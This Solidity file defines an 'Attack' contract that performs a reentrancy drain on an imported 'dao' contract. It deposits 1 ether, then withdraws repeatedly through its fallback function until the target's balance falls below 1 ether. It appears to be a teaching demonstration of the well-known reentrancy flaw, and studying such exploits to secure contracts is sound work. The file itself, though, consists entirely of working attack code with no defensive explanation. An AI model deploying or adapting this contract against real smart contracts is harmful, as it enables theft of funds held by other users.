// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "dao.sol";

contract Attack {
  dao public etherStore;

  constructor (address _etherStoreAddress) {
    etherStore = dao(_etherStoreAddress);
  }

  // Fallback is called when EtherStore sends Ether to this contract.
  fallback() external payable {
    if (address(etherStore).balance >= 1 ether) {
      etherStore.withdraw(1 ether);
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    etherStore.deposit{value: 1 ether}();
    etherStore.withdraw (1 ether);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}
